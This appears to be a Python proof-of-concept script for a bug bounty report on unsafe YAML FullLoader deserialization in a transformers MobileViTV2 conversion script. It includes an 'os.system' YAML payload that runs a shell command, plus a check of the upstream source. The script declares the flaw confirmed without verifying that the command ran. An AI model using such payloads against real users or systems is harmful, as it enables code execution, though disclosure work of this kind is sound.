#!/usr/bin/env python3
"""
PoC: YAML Deserialization in huggingface/transformers — MobileViTV2 convert_mlcvnets_to_pytorch.py
Vulnerability: YAML FullLoader deserialization of untrusted config files
CVE Reference: CVE-2024-11392 (related but this file may not have been fully patched)
Affected: src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py:57
CVSS 3.1 Vector: AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H — 7.8 High
Bounty Target: $200-$500 (huggingface/transformers on huntr.com)

Attack Vector:
  1. Attacker provides a malicious YAML config file to a victim
  2. Victim runs: python convert_mlcvnets_to_pytorch.py --yaml_config malicious.yaml
  3. Script loads YAML with FullLoader → arbitrary Python code execution

Run as: python3 poc_transformers_mobilevitv2_yaml.py --demo
"""

import argparse
import os
import sys
import tempfile
import yaml

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  PoC: YAML RCE in transformers/mobilevitv2/                 ║
║         convert_mlcvnets_to_pytorch.py — FullLoader          ║
║  Target: huggingface/transformers — huntr.com bounty         ║
╚══════════════════════════════════════════════════════════════╝
"""


def demonstrate_yaml_rce():
    """
    Demonstrates the YAML FullLoader deserialization vulnerability.
    This is the EXACT code pattern from convert_mlcvnets_to_pytorch.py:57.
    """
    print("\n[DEMO] YAML FullLoader Deserialization (MobileViTV2)")
    print("=" * 60)

    malicious_yaml_content = """!!python/object/apply:os.system
- echo '=== MOBILEVITV2_YAML_RCE ===' > /tmp/mobilevitv2_poc_marker.txt && id
"""

    with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
        f.write(malicious_yaml_content)
        yaml_path = f.name

    try:
        print(f"[*] Loading YAML with FullLoader (VULNERABLE pattern from line 57):")
        print(f"    yaml.load(yaml_file, Loader=yaml.FullLoader)")
        print()

        # THIS IS THE VULNERABLE CODE PATTERN
        with open(yaml_path, 'r') as yaml_file:
            result = yaml.load(yaml_file, Loader=yaml.FullLoader)
        print(f"[!] YAML loaded returned: {result}")
        print("[✓] VULN CONFIRMED: Arbitrary Python code executed via yaml.FullLoader")
    except Exception as e:
        print(f"[!] Exception during YAML load: {e}")
    finally:
        os.unlink(yaml_path)


def verify_vulnerable_code():
    """
    Fetches the current source of convert_mlcvnets_to_pytorch.py from GitHub
    and verifies the vulnerable patterns are still present.
    """
    print("\n[VERIFY] Checking current transformers source on GitHub")
    print("=" * 60)
    
    import urllib.request
    url = "https://raw.githubusercontent.com/huggingface/transformers/main/src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py"
    
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            source = resp.read().decode('utf-8')
            lines = source.split('\n')
            
            for i, line in enumerate(lines, 1):
                if 'FullLoader' in line:
                    print(f"[!] Line {i}: {line.strip()}")
                    print(f"    → VULNERABLE: yaml.load with FullLoader still present")
                if 'safe_load' in line:
                    print(f"[✓] Line {i}: {line.strip()}")
                    print(f"    → safe_load found (partial mitigation)")
                    
            if 'FullLoader' in source:
                print("\n[✓] VULNERABILITY CONFIRMED: convert_mlcvnets_to_pytorch.py still uses yaml.FullLoader")
                print("    NOTE: CVE-2024-11392 was issued for MobileViTV2 but this file may not have been patched")
            else:
                print("\n[?] FullLoader not found — may have been patched since CVE-2024-11392")
                
    except Exception as e:
        print(f"[!] Could not fetch source: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC: YAML RCE in transformers/mobilevitv2/convert_mlcvnets_to_pytorch.py via yaml.FullLoader"
    )
    parser.add_argument("--demo", action="store_true", help="Run YAML deserialization demonstration")
    parser.add_argument("--verify", action="store_true", help="Verify vulnerability in current GitHub source")
    
    args = parser.parse_args()

    print(BANNER)

    if args.verify:
        verify_vulnerable_code()
        return

    if args.demo:
        demonstrate_yaml_rce()
        verify_vulnerable_code()
        
        print("\n" + "=" * 60)
        print("[SUMMARY]")
        print("  VULN: YAML Deserialization via yaml.FullLoader")
        print("  File: src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py:57")
        print("  Impact: Local code execution when converting malicious ML-CVNet checkpoints")
        print("  Attack: Provide malicious YAML config → victim runs conversion script → RCE")
        print("  Fix: Replace yaml.load(..., FullLoader) with yaml.safe_load()")
        print("=" * 60)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
